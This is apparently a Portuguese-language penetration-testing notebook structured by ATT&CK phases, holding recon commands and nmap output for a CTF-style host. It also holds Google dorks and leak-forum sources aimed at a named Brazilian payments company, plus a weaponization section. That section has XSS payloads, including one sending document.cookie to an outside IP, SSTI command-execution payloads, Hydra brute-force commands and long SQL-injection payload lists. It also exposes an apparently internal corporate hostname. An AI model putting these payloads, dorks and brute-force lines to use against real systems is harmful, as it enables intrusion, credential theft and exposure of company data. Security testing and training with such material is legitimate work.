- **Reconnaissance** ([TA0043](https://attack.mitre.org/techniques/T1595))
    - 💻 Host Information
        - Ping (TTL fingerprinting)
            - Descobrindo TTL (Time to Live)
                
                ```bash
                ping -c 5 $host
                ```
                
                - Se entre 65 e 128 = Windows
                - Se abaixo de 65 = Linux
                - Acima de 128 = Provavelmente um appliance ou sistema específico
            - Resultado Ping
                
                ```bash
                64 bytes from 10.10.10.3: icmp_seq=13 ttl=63 time=193 ms
                64 bytes from 10.10.10.3: icmp_seq=14 ttl=63 time=217 ms
                64 bytes from 10.10.10.3: icmp_seq=15 ttl=63 time=153 ms
                64 bytes from 10.10.10.3: icmp_seq=16 ttl=63 time=162 ms
                ```
                
        - Port Scan [Threader3000](https://github.com/dievus/threader3000/blob/master/threader3000.py)
            - threader3000
                
                ```bash
                ./threader3000.py
                ```
                
            - Resultado Port Scan
                
                ```markdown
                Port 21 is open
                Port 22 is open
                Port 139 is open
                Port 445 is open
                Port 3632 is open
                Port scan completed in 0:01:38.920399
                ```
                
        - Nmap Network Mapping TCP
            - Nmap
                
                ```bash
                sudo nmap -Pn -sV -sS -sCV -O -p0-65535 -4 $host
                ```
                
            - Resultado Nmap TCP
                
                ```json
                Starting Nmap 7.80 ( https://nmap.org ) at 2023-07-24 17:24 -03
                Nmap scan report for 10.10.10.3
                Host is up (0.15s latency).
                Not shown: 65531 filtered ports
                PORT     STATE SERVICE     VERSION
                21/tcp   open  ftp         vsftpd 2.3.4
                |_ftp-anon: Anonymous FTP login allowed (FTP code 230)
                | ftp-syst: 
                |   STAT: 
                | FTP server status:
                |      Connected to 10.10.14.15
                |      Logged in as ftp
                |      TYPE: ASCII
                |      No session bandwidth limit
                |      Session timeout in seconds is 300
                |      Control connection is plain text
                |      Data connections will be plain text
                |      vsFTPd 2.3.4 - secure, fast, stable
                |_End of status
                22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
                | ssh-hostkey: 
                |   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
                |_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
                139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
                445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
                3632/tcp open  distccd     distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
                Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
                Aggressive OS guesses: OpenWrt White Russian 0.9 (Linux 2.4.30) (92%), Linux 2.6.23 (92%), Belkin N300 WAP (Linux 2.6.30) (92%), Control4 HC-300 home controller (92%), D-Link DAP-1522 WAP, or Xerox WorkCentre Pro 245 or 6556 printer (92%), Dell Integrated Remote Access Controller (iDRAC5) (92%), Dell Integrated Remote Access Controller (iDRAC6) (92%), Linksys WET54GS5 WAP, Tranzeo TR-CPQ-19f WAP, or Xerox WorkCentre Pro 265 printer (92%), Linux 2.4.21 - 2.4.31 (likely embedded) (92%), Citrix XenServer 5.5 (Linux 2.6.18) (92%)
                No exact OS matches for host (test conditions non-ideal).
                Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
                
                Host script results:
                |_ms-sql-info: ERROR: Script execution failed (use -d to debug)
                |_smb-os-discovery: ERROR: Script execution failed (use -d to debug)
                |_smb-security-mode: ERROR: Script execution failed (use -d to debug)
                |_smb2-time: Protocol negotiation failed (SMB2)
                
                OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
                Nmap done: 1 IP address (1 host up) scanned in 264.38 seconds
                ```
                
        - Nmap Network Mapping UDP
            - Resultados
                
                ```json
                
                ```
                
            
            ```bash
            sudo nmap -sV -T4 -sU -sC -O -4 $host
            ```
            
    - 🎯 URLs/Endpoints/Subdomains
        - Curl (Headers fingerprinting)
            - Curl
                
                ```bash
                sudo curl https://$host -k --silent --head
                ```
                
            - Resultados
                
                ```bash
                HTTP/2 200 
                date: Wed, 19 Apr 2023 19:13:51 GMT
                content-type: text/html; charset=utf-8
                content-length: 413
                server: openresty/1.21.4.1
                ```
                
        - openssl
            - Basics
                - Resultados
                    
                    ```bash
                    CONNECTED(00000003)
                    depth=2 C = US, O = Amazon, CN = Amazon Root CA 1
                    verify return:1
                    depth=1 C = US, O = Amazon, CN = Amazon RSA 2048 M02
                    verify return:1
                    depth=0 CN = *.ctf.hacker101.com
                    verify return:1
                    ---
                    Certificate chain
                     0 s:CN = *.ctf.hacker101.com
                       i:C = US, O = Amazon, CN = Amazon RSA 2048 M02
                       a:PKEY: rsaEncryption, 2048 (bit); sigalg: RSA-SHA256
                       v:NotBefore: Feb  7 00:00:00 2023 GMT; NotAfter: Mar  8 23:59:59 2024 GMT
                     1 s:C = US, O = Amazon, CN = Amazon RSA 2048 M02
                       i:C = US, O = Amazon, CN = Amazon Root CA 1
                       a:PKEY: rsaEncryption, 2048 (bit); sigalg: RSA-SHA256
                       v:NotBefore: Aug 23 22:25:30 2022 GMT; NotAfter: Aug 23 22:25:30 2030 GMT
                     2 s:C = US, O = Amazon, CN = Amazon Root CA 1
                       i:C = US, ST = Arizona, L = Scottsdale, O = "Starfield Technologies, Inc.", CN = Starfield Services Root Certificate Authority - G2
                       a:PKEY: rsaEncryption, 2048 (bit); sigalg: RSA-SHA256
                       v:NotBefore: May 25 12:00:00 2015 GMT; NotAfter: Dec 31 01:00:00 2037 GMT
                     3 s:C = US, ST = Arizona, L = Scottsdale, O = "Starfield Technologies, Inc.", CN = Starfield Services Root Certificate Authority - G2
                       i:C = US, O = "Starfield Technologies, Inc.", OU = Starfield Class 2 Certification Authority
                       a:PKEY: rsaEncryption, 2048 (bit); sigalg: RSA-SHA256
                       v:NotBefore: Sep  2 00:00:00 2009 GMT; NotAfter: Jun 28 17:39:16 2034 GMT
                    ---
                    Server certificate
                    -----BEGIN CERTIFICATE-----
                    MIIF0zCCBLugAwIBAgIQBahSWC/AeCupQQbgwmoHwzANBgkqhkiG9w0BAQsFADA8
                    MQswCQYDVQQGEwJVUzEPMA0GA1UEChMGQW1hem9uMRwwGgYDVQQDExNBbWF6b24g
                    UlNBIDIwNDggTTAyMB4XDTIzMDIwNzAwMDAwMFoXDTI0MDMwODIzNTk1OVowHjEc
                    MBoGA1UEAwwTKi5jdGYuaGFja2VyMTAxLmNvbTCCASIwDQYJKoZIhvcNAQEBBQAD
                    ggEPADCCAQoCggEBALdsjnE+6lQj1eXDfWnuNas3Rmg7iy3zZha34EKiw5/2KWty
                    WZxefD8ln29cH6ZY7RjPT8tGFchKH83eoJR/ReBIVqiKzxa5mRc2nRAGe1Dupoes
                    YP9RUllNlnZGn7Yedb/ZMRFKTiIdPfktEYnYdtxakK9GQaOAoFlL/Jgmp3yG01mZ
                    pZtRYHbakNZpz15LFGMsQzxGLpRneg1rlA2rjQz2CeCWuhbWLROoQZpCMF9I5LYe
                    P1Vgcjusf0n4xolPPcIaKTx0smWfxldx+No8ue6Ll2kQqHdn2T+G2UM52IaTcSTX
                    S/9NTiYgmihTy8iTrg0LwO502zS9i6YIF9mJyfkCAwEAAaOCAu0wggLpMB8GA1Ud
                    IwQYMBaAFMAxUs1aUMOCfHRxzsvpnPl664LiMB0GA1UdDgQWBBSWbFfXHEwvtSwK
                    tbMwbhrkwUPX/DAeBgNVHREEFzAVghMqLmN0Zi5oYWNrZXIxMDEuY29tMA4GA1Ud
                    DwEB/wQEAwIFoDAdBgNVHSUEFjAUBggrBgEFBQcDAQYIKwYBBQUHAwIwOwYDVR0f
                    BDQwMjAwoC6gLIYqaHR0cDovL2NybC5yMm0wMi5hbWF6b250cnVzdC5jb20vcjJt
                    MDIuY3JsMBMGA1UdIAQMMAowCAYGZ4EMAQIBMHUGCCsGAQUFBwEBBGkwZzAtBggr
                    BgEFBQcwAYYhaHR0cDovL29jc3AucjJtMDIuYW1hem9udHJ1c3QuY29tMDYGCCsG
                    AQUFBzAChipodHRwOi8vY3J0LnIybTAyLmFtYXpvbnRydXN0LmNvbS9yMm0wMi5j
                    ZXIwDAYDVR0TAQH/BAIwADCCAX8GCisGAQQB1nkCBAIEggFvBIIBawFpAHYA7s3Q
                    ZNXbGs7FXLedtM0TojKHRny87N7DUUhZRnEftZsAAAGGKWmpNAAABAMARzBFAiBM
                    SWmybZALN3llJ7pazbLT6Js1n9VplaCnE7O0UEK/WgIhAJQReiO8RB8ZHe57A8+K
                    F78sYu+3G0CtRQFJ/OI7TVRoAHYAc9meiRtMlnigIH1HneayxhzQUV5xGSqMa4AQ
                    esF3crUAAAGGKWmpUgAABAMARzBFAiEAyL2Op8jXl9FBVmyk+MavS7VCrLG0+Mpj
                    kKHjw60K2QECIAQzmDhnJYEnfULY/rk3NiKTWSKqoLEk6Q/Tvdg0rowjAHcASLDj
                    a9qmRzQP5WoC+p0w6xxSActW3SyB2bu/qznYhHMAAAGGKWmpDwAABAMASDBGAiEA
                    tQKuUZsb7J4IM2AkyTRhJBTWlX72R9nxXK5pid4si74CIQDjdayMU163aKdgS2q2
                    Hl91apaM7MXJok3VhGOaGxxfjDANBgkqhkiG9w0BAQsFAAOCAQEAMZaJ8kw6p93L
                    9ed2qp0PJL9ifpUp4moTsb9dw1OX8kaH53TwaoYWiSiXGtTYM9+6R2i3QfoE3kB/
                    YXcHF3P2RjTKWhPvurTkRPQWV4HxMq6ArMdSLUOS8/S05JnDX1DiFbQtSh2vmxgj
                    VJtW/pGqaJQ5H6AaBxWJrC2HN3lWiV2JlRrsyTEBTXJqsEsjmGUX4E9JYW8hpUa0
                    SoFfLxc11w9T6jbQ/k/m291cYk0+SY/u7gMkw8WbgeIh2SXMUqx5i3QGvK2ekMRP
                    W/A1DmG/PBFB5EB2LTturn5oJ5CKzfrexsMC56Ak1JtBWaVdLUxbH6Wm2sicfiFG
                    pM+LUNSA6g==
                    -----END CERTIFICATE-----
                    subject=CN = *.ctf.hacker101.com
                    issuer=C = US, O = Amazon, CN = Amazon RSA 2048 M02
                    ---
                    No client certificate CA names sent
                    Peer signing digest: SHA256
                    Peer signature type: RSA
                    Server Temp Key: ECDH, prime256v1, 256 bits
                    ---
                    SSL handshake has read 5582 bytes and written 478 bytes
                    Verification: OK
                    ---
                    New, TLSv1.2, Cipher is ECDHE-RSA-AES128-GCM-SHA256
                    Server public key is 2048 bit
                    Secure Renegotiation IS supported
                    Compression: NONE
                    Expansion: NONE
                    No ALPN negotiated
                    SSL-Session:
                        Protocol  : TLSv1.2
                        Cipher    : ECDHE-RSA-AES128-GCM-SHA256
                        Session-ID: 44EC615646099A539304652D1D57CACE66F40514D4B3249AA516672A839BD535
                        Session-ID-ctx: 
                        Master-Key: 5CF43FCE89339A1A020D3E277C54645F4235F76BC20D6922E46E2CD0BB8B388CAD90EDA0B4C4070202B055AEB12567AF
                        PSK identity: None
                        PSK identity hint: None
                        SRP username: None
                        TLS session ticket lifetime hint: 86400 (seconds)
                        TLS session ticket:
                        0000 - a4 09 a6 a6 63 2a 01 b7-d9 aa 66 50 85 3b d7 b8   ....c*....fP.;..
                        0010 - 4b 22 46 4f 15 2a e3 40-62 77 ba 03 51 91 fa 5c   K"FO.*.@bw..Q..\
                        0020 - a1 22 3c 0d af cc b6 4d-46 45 1d 00 f1 77 e4 c3   ."<....MFE...w..
                        0030 - 15 39 99 65 0c 82 11 e7-41 d8 be b6 f9 f2 1e ec   .9.e....A.......
                        0040 - b2 e4 a3 49 ff 1b 50 69-d3 c9 75 71 0f 14 92 90   ...I..Pi..uq....
                        0050 - 9d e2 24 9d 37 e2 f1 80-36 4a 9c 29 93 c5 76 e5   ..$.7...6J.)..v.
                        0060 - 65 f0 5c 2c fa 4d 92 c6-d1                        e.\,.M...
                    
                        Start Time: 1681932181
                        Timeout   : 7200 (sec)
                        Verify return code: 0 (ok)
                        Extended master secret: yes
                    ---
                    ```
                    
                
                ```bash
                openssl s_client -connect $host:443
                ```
                
        - Gobuster
            - Basicos
                - Resultados
                    
                    ```markdown
                    ===============================================================
                    Gobuster v3.4
                    by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
                    ===============================================================
                    [+] Url:                     https://d98133dc5b2afb57089b9bd0847d370d.ctf.hacker101.com
                    [+] Method:                  GET
                    [+] Threads:                 10
                    [+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/common.txt
                    [+] Negative Status codes:   503,404
                    [+] User Agent:              gobuster/3.4
                    [+] Follow Redirect:         true
                    [+] Timeout:                 10s
                    ===============================================================
                    2023/04/19 16:34:09 Starting gobuster in directory enumeration mode
                    ===============================================================
                    /fetch                (Status: 400) [Size: 192]
                    Progress: 4713 / 4714 (99.98%)
                    ===============================================================
                    2023/04/19 16:37:09 Finished
                    ===============================================================
                    ```
                    
                
                ```bash
                gobuster dir -k —random-agent -r -w /usr/share/seclists/Discovery/Web-Content/common.txt --no-error -b 404,503 -u [https://](http://10.10.19.72/)$host
                ```
                
                ```bash
                gobuster dir -k —random-agent -r -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt --no-error -b 404,503 -u [https://](http://10.10.19.72/)$host
                ```
                
            - Com Extensões
                - Resultados
                    
                    ```bash
                    
                    ```
                    
                
                ```bash
                gobuster dir -k —random-agent -r -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -x txt,php,xml,log,json,jhtml --no-error -b 404,503 -u [https://](http://10.10.19.72/)$host
                ```
                
            - Wordlists
                - [ ]  [SecLists common.txt](https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/common.txt)
                - [ ]  [SecLists directory-list-2.3-medium.txt](https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/directory-list-2.3-medium.txt)
                - [ ]  [Assetnotes Swagger-wordlist.txt](https://wordlists-cdn.assetnote.io/data/kiterunner/swagger-wordlist.txt)
                - [ ]  [Assetnotes php.txt](https://wordlists-cdn.assetnote.io/data/manual/php.txt)
                - [ ]  [SecLists spring-boot.txt](https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/spring-boot.txt)
                - [ ]  [Seclists Wordpress.fuzz.txt](https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/CMS/wordpress.fuzz.txt)
            - Extensões
                - [ ]  sh,txt,php,html,htm,asp,aspx,js,xml,log,json,jpg,jpeg,png,gif,doc,pdf,mpg,mp3,zip,tar.gz,tar
                - [ ]  -d (para extensões de backup)
        - [Kiterunner](https://github.com/assetnote/kiterunner/releases)
            - [ ]  ./kr scan 'https://[u](https://receivable-unit.financeiro.qa.aws.intranet.pagseguro.uol/)rl/' -w swagger-wordlist.txt -x 10 --fail-status-codes 406,404
            - [ ]  ./kr scan 'https://[u](https://receivable-unit.financeiro.qa.aws.intranet.pagseguro.uol/)rl/' -w routes-small.txt -x 10 --fail-status-codes 406,404
            - [ ]  (php) ./kr scan 'http://161.35.62.49/' -A php -x 10 --fail-status-codes 406,404
            - [ ]  Wordlists
                - [ ]  [routes-small.kite](https://wordlists-cdn.assetnote.io/data/kiterunner/routes-small.kite.tar.gz)
                - [ ]  [swagger-wordlist.txt](https://wordlists-cdn.assetnote.io/data/kiterunner/swagger-wordlist.txt)
                - [ ]  [Wordlist-assetlist.io](https://wordlists-cdn.assetnote.io/)
                - [ ]  kr wordlist list (para verificar as wordlists e usar com o parâmetro -A)
        - BurpSuite
            - Verificar Comentarios da pagina se há alguma informação valiosa
        - SubFinder
            - Testar com outros dominios o mesmo nome
        - Params Discover
            - [Arjun](https://github.com/s0md3v/Arjun)
                - [ ]  arjun -u http://11.11.11.11/administration.php
                - [ ]  Wordlists
                    - [ ]  default do arjun
                    - [ ]  [burp-parameter-names](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/burp-parameter-names.txt)
                    - [ ]  [param-miner](https://raw.githubusercontent.com/PortSwigger/param-miner/master/resources/params)
                    - [ ]  https://wordlists-cdn.assetnote.io/data/automated/httparchive_parameters_top_1m_2021_10_28.txt
                    - [ ]  https://gist.github.com/nullenc0de/9cb36260207924f8e1787279a05eb773
            - wfuzz
                
                ```bash
                wfuzz -c -w /usr/share/wordlists/params.txt --hw 3 "https://$host/ticket?FUZZ=FUZZ"
                ```
                
        - 403?
            - Verifique os 403 com nullbytes ao final (intruder)
                - [ ]  %00
                %0d%0a
                %0d
                %0a
                %09
                %0C
                %20
            - Changing IP origin using headers
                - [ ]  X-Forwarded-Host: 127.0.0.1
                X-Originating-IP: 127.0.0.1
                X-Remote-IP: 127.0.0.1
                X-Remote-Addr: 127.0.0.1
                X-Client-IP: 127.0.0.1
                X-Host: 127.0.0.1
                Referer 127.0.0.1
                X-Forwarded-For: 127.0.0.1
            - Changing method
            - Adding parameters
    - Vulnerability Scanner
        - Technologies
            - Whatweb
                
                ```markdown
                whatweb https://$host
                ```
                
            - Procurar vulnerabilidades conhecidas das versões dos softwares
                - [ ]  [Exploitdb](https://www.exploit-db.com/) (searchsploit)
                - [ ]  [Awesome-cve-poc](https://github.com/qazbnm456/awesome-cve-poc#toc473)
                - [ ]  [Log4J](https://github.com/rwincey/CVE-2021-44228-PoC-log4j-bypass-words)
                - [ ]  [Sploitus](https://sploitus.com/?query=spring#exploits)
                - [ ]  [Nuclei](https://github.com/projectdiscovery/nuclei-templates/tree/master/cves)
                - [ ]  [Kernel-Exploits](https://github.com/lucyoa/kernel-exploits)
                - [ ]  [CVEDetails](https://www.cvedetails.com/vulnerability-list/vendor_id-22021/product_id-71490/version_id-607591/Openresty-Openresty--.html)
    - OSINT
        - Github
            - [ ]  Existe algum repositorio publico dos colaboradores do time que expõe dados da empresa?
            - [ ]  Existe relatos do repositorio no google? (google-dorks)
        - Google Dorks
            - [ ]  inurl:http | inurl:url= | inurl:path= | inurl:dest= | inurl:html= | inurl:data= | inurl:domain= | inurl:page= inurl:& site:example[.]com
            - [ ]  site:pagsegurol.uol.com.br inurl:login | inurl:signin | intitle:Login | intitle:"sign in" | inurl:auth
            - [ ]  site:*.pagsegurol.uol.com.br
            - [ ]  `site:"*.atlassian.net" inurl:"/wiki"`
            - [ ]  inurl:"@pastebin.com" pagseguro AND password
            - [ ]  site:pastebin.com | site:paste2.org | site:pastehtml.com | site:slexy.org | site:snipplr.com | site:snipt.net | site:textsnip.com | site:bitpaste.app | site:justpaste.it | site:heypasteit.com | site:hastebin.com | site:dpaste.org | site:dpaste.com | site:codepad.org | site:jsitor.com | site:codepen.io | site:jsfiddle.net | site:dotnetfiddle.net | site:phpfiddle.org | site:ide.geeksforgeeks.org | site:repl.it | site:ideone.com | site:paste.debian.net | site:paste.org | site:paste.org.ru | site:codebeautify.org | site:codeshare.io | site:trello.com "[pagseguro](http://pagsegurol.uol.com.br/)" AND “PASSWORD”
            - [ ]  site:pagsegurol.uol.com.br ext:doc | ext:docx | ext:odt | ext:rtf | ext:sxw | ext:psw | ext:ppt | ext:pptx | ext:pps | ext:csv
            
        - Linkedin
            - Google dorks para procurar por trechos da aplicação
        - DeepWeb
        - Shodan
        - Verificar se os emails dos colaboradores possuem vazamentos
        - [ghunt](https://github.com/mxrch/GHunt)
        - Busca por leaks:
            - https://search.illicit.services/records?emails=serasaexperian.com.br
            - https://intelx.io/
            - https://haveibeenpwned.com/Passwords
            - Forums
                - database.cc
                - raidforums
                - breachforum
                - base8 (telegram)
                - weleakdatabase (telegram)
                - ghostsec (telegram)
    - OSINT “Interno”
        - Histórico do slack
        - Histórico de commits
        - Jenkins
            - Procurar por jobs legados e atuais da aplicação e verificar os logs de execução
        - Logs do Splunk
        - Fortify
- Teorização
    - Seria possível um ataque utilizando o FTP ?
        - A aplicação permite login anônimo.
        - Existe um exploit público para a versão do ftp (vsFTPd 2.3.4)
            - Não funcionou. O login anônimo não conseguiu executar o exploit.
    - Algum exploit para o SSH OpenSSH 4.7p1 ?
    - Ataque utilizando netbios ?
        
        ```jsx
        139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
        445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
        ```
        
    - Utilizando uma porta estranha 3632
        
        ```jsx
        3632/tcp open  distccd     distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
        ```
        
- **Weaponization** ([TA0042](https://attack.mitre.org/tactics/TA0042/) e [TA0001](https://attack.mitre.org/tactics/TA0001/))
    - XSS?
        - Basic XSS
            
            ```bash
            ‘”>;?>{{7*7}}<script>alert(”absolem”)</script>
            ```
            
            ```markdown
            <svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"/>
            
            <svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>
            <svg><foreignObject><![CDATA[</foreignObject><script>alert(2)</script>]]></svg>
            <svg><title><![CDATA[</title><script>alert(3)</script>]]></svg>
            ```
            
            ```markdown
            <code>
            <?xml version="1.0" encoding="UTF-8" standalone="yes"?>
            <svg
            onload="window.location='http://www.example.com'"
            xmlns="http://www.w3.org/2000/svg">
            </svg>
            </code>
            ```
            
            ```markdown
            <script>alert(1)</script>
            
            ```
            
            ```bash
            <img src=x onerror=alert(1) />
            ```
            
            ```bash
            <img src=x onerror=this.src="http://143.198.18.214/?c="+document.cookie>
            ```
            
        - Evasion XSS
            
            https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html
            
            ```bash
            javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>
            ```
            
        - Markdown XSS
            
            ```markdown
            [Basic](javascript:alert('Basic'))
            ```
            
            ```markdown
            [a](javascript:prompt(document.cookie))
            ```
            
        - Coisas uteis para recuperar via xss:
            - [ ]  document.domain (URL)
            - [ ]  
        - Extras payloads:
            
            ```jsx
            https://tinyxss.terjanq.me/
            ```
            
    - SSTI?
        - Payload Poliglota ( to looking for errors)
            
            ```bash
            ${{<%[%'"}}%\
            ```
            
        - Payload para printar uma string em asp
            
            ```bash
            <% response.write("my asp script")%>
            ```
            
        - Payload para verificar se há processamento do código
            
            ```bash
            {{7*7}}
            ```
            
            ```bash
            <%= 7*7 %>
            ```
            
        - Payload para executar comandos no windows
            
            ```bash
            <%response.write CreateObject("WScript.Shell").Exec("cmd /c ping -n 4 10.10.16.2").StdOut.Readall()%>
            ```
            
    - Brute force dictionary (Hydra)
        - HTTP
            
            ```markdown
            hydra -I $host -l brigid http-form-post "/login:username=^USER^&password=^PASS^:Invalid password" -P /usr/share/wordlists/rockyou.txt
            ```
            
        - SSL HTTPS
            
            ```bash
            hydra -S -v -I $host http-form-post "/login:username=^USER^&password=^PASS^:Invalid password" -P /usr/share/wordlists/rockyou.txt -l admin
            ```
            
    - SQLI
        - Poliglotas
            
            ```php
            '";>#--%*&^`+\
            ```
            
        - Basicos:
            - Mysql
                
                ```jsx
                admin' or 1=1-- -
                
                1 or 1=1--
                
                1' or '1'='1'--
                
                admin'--
                
                administrador'--
                ```
                
            - Microsoft SqlServer
                
                ```jsx
                Id=ORD-003' WAITFOR DELAY '0:0:5'-- YSIp
                ```
                
                ```jsx
                ?Id=ORD-003';IF(5372=5372) SELECT 5372 ELSE DROP FUNCTION ZZSu—
                ```
                
            
            - intruder:
                
                ```markdown
                true
                1
                1>0
                2-1
                0+1
                1*1
                1%2
                1 & 1
                1&1
                1 && 2
                1&&2
                -1 || 1
                -1||1
                -1 oR 1=1
                1 aND 1=1
                (1)oR(1=1)
                (1)aND(1=1)
                -1/**/oR/**/1=1
                1/**/aND/**/1=1
                1'
                1'>'0
                2'-'1
                0'+'1
                1'*'1
                1'%'2
                1'&'1'='1
                1'&&'2'='1
                -1'||'1'='1
                -1'oR'1'='1
                1'aND'1'='1
                1"
                1">"0
                2"-"1
                0"+"1
                1"*"1
                1"%"2
                1"&"1"="1
                1"&&"2"="1
                -1"||"1"="1
                -1"oR"1"="1
                1"aND"1"="1
                1`
                1`>`0
                2`-`1
                0`+`1
                1`*`1
                1`%`2
                1`&`1`=`1
                1`&&`2`=`1
                -1`||`1`=`1
                -1`oR`1`=`1
                1`aND`1`=`1
                1')>('0
                2')-('1
                0')+('1
                1')*('1
                1')%('2
                1')&'1'=('1
                1')&&'1'=('1
                -1')||'1'=('1
                -1')oR'1'=('1
                1')aND'1'=('1
                1")>("0
                2")-("1
                0")+("1
                1")*("1
                1")%("2
                1")&"1"=("1
                1")&&"1"=("1
                -1")||"1"=("1
                -1")oR"1"=("1
                1")aND"1"=("1
                1`)>(`0
                2`)-(`1
                0`)+(`1
                1`)*(`1
                1`)%(`2
                1`)&`1`=(`1
                1`)&&`1`=(`1
                -1`)||`1`=(`1
                -1`)oR`1`=(`1
                1`)aND`1`=(`1
                ```
                
            - Intruder 2
                
                ```markdown
                ' or '1'='1
                ' or ''='
                ' or 1]%00
                ' or /* or '
                ' or "a" or '
                ' or 1 or '
                ' or true() or '
                'or string-length(name(.))<10 or'
                'or contains(name,'adm') or'
                'or contains(.,'adm') or'
                'or position()=2 or'
                admin' or '
                admin' or '1'='2
                *
                *)(&
                *)(|(&
                pwd)
                *)(|(*
                *))%00
                admin)(&)
                pwd
                admin)(!(&(|
                pwd))
                admin))(|(|
                1234
                '-'
                ' '
                '&'
                '^'
                '*'
                ' or ''-'
                ' or '' '
                ' or ''&'
                ' or ''^'
                ' or ''*'
                "-"
                " "
                "&"
                "^"
                "*"
                " or ""-"
                " or "" "
                " or ""&"
                " or ""^"
                " or ""*"
                or true--
                " or true--
                ' or true--
                ") or true--
                ') or true--
                ' or 'x'='x
                ') or ('x')=('x
                ')) or (('x'))=(('x
                " or "x"="x
                ") or ("x")=("x
                ")) or (("x"))=(("x
                or 1=1
                or 1=1--
                or 1=1#
                or 1=1/*
                admin' --
                admin' #
                admin'/*
                admin' or '1'='1
                admin' or '1'='1'--
                admin' or '1'='1'#
                admin' or '1'='1'/*
                admin'or 1=1 or ''='
                admin' or 1=1
                admin' or 1=1--
                admin' or 1=1#
                admin' or 1=1/*
                admin') or ('1'='1
                admin') or ('1'='1'--
                admin') or ('1'='1'#
                admin') or ('1'='1'/*
                admin') or '1'='1
                admin') or '1'='1'--
                admin') or '1'='1'#
                admin') or '1'='1'/*
                1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055
                1234 ' AND 1=0 UNION ALL SELECT 'admin', '7110eda4d09e062aa5e4a390b0a572ac0d2c0220
                admin" --
                admin" #
                admin"/*
                admin" or "1"="1
                admin" or "1"="1"--
                admin" or "1"="1"#
                admin" or "1"="1"/*
                admin"or 1=1 or ""="
                admin" or 1=1
                admin" or 1=1--
                admin" or 1=1#
                admin" or 1=1/*
                admin") or ("1"="1
                admin") or ("1"="1"--
                admin") or ("1"="1"#
                admin") or ("1"="1"/*
                admin") or "1"="1
                admin") or "1"="1"--
                admin") or "1"="1"#
                admin") or "1"="1"/*
                1234 " AND 1=0 UNION ALL SELECT "admin", "81dc9bdb52d04dc20036dbd8313ed055
                1234 " AND 1=0 UNION ALL SELECT "admin", "7110eda4d09e062aa5e4a390b0a572ac0d2c0220
                ==
                =
                '
                ' --
                ' #
                ' –
                '--
                '/*
                '#
                " --
                " #
                "/*
                ' and 1='1
                ' and a='a
                or true
                ' or ''='
                " or ""="
                1′) and '1′='1–
                ' AND 1=0 UNION ALL SELECT '', '81dc9bdb52d04dc20036dbd8313ed055
                " AND 1=0 UNION ALL SELECT "", "81dc9bdb52d04dc20036dbd8313ed055
                ' AND 1=0 UNION ALL SELECT '', '7110eda4d09e062aa5e4a390b0a572ac0d2c0220
                " AND 1=0 UNION ALL SELECT "", "7110eda4d09e062aa5e4a390b0a572ac0d2c0220
                and 1=1
                and 1=1–
                ' and 'one'='one
                ' and 'one'='one–
                ' group by password having 1=1--
                ' group by userid having 1=1--
                ' group by username having 1=1--
                like '%'
                or 0=0 --
                or 0=0 #
                or 0=0 –
                ' or         0=0 #
                ' or 0=0 --
                ' or 0=0 #
                ' or 0=0 –
                " or 0=0 --
                " or 0=0 #
                " or 0=0 –
                %' or '0'='0
                or 1=1–
                ' or 1=1--
                ' or '1'='1
                ' or '1'='1'--
                ' or '1'='1'/*
                ' or '1'='1'#
                ' or '1′='1
                ' or 1=1
                ' or 1=1 --
                ' or 1=1 –
                ' or 1=1;#
                ' or 1=1/*
                ' or 1=1#
                ' or 1=1–
                ') or '1'='1
                ') or '1'='1--
                ') or '1'='1'--
                ') or '1'='1'/*
                ') or '1'='1'#
                ') or ('1'='1
                ') or ('1'='1--
                ') or ('1'='1'--
                ') or ('1'='1'/*
                ') or ('1'='1'#
                'or'1=1
                'or'1=1′
                " or "1"="1
                " or "1"="1"--
                " or "1"="1"/*
                " or "1"="1"#
                " or 1=1
                " or 1=1 --
                " or 1=1 –
                " or 1=1--
                " or 1=1/*
                " or 1=1#
                " or 1=1–
                ") or "1"="1
                ") or "1"="1"--
                ") or "1"="1"/*
                ") or "1"="1"#
                ") or ("1"="1
                ") or ("1"="1"--
                ") or ("1"="1"/*
                ") or ("1"="1"#
                ) or '1′='1–
                ) or ('1′='1–
                ' or 1=1 LIMIT 1;#
                'or 1=1 or ''='
                "or 1=1 or ""="
                ' or a=a--
                ' or a=a–
                " or "a"="a
                ") or ("a"="a
                ') or ('a'='a and hi") or ("a"="a
                ' or 'one'='one
                ' or 'one'='one–
                ' or uid like '%
                ' or uname like '%
                ' or userid like '%
                ' or user like '%
                ' or username like '%
                ') or ('x'='x
                ' OR 'x'='x'#;
                '=' 'or' and '=' 'or'
                ' UNION ALL SELECT 1, @@version;#
                ' UNION ALL SELECT system_user(),user();#
                ' UNION select table_schema,table_name FROM information_Schema.tables;#
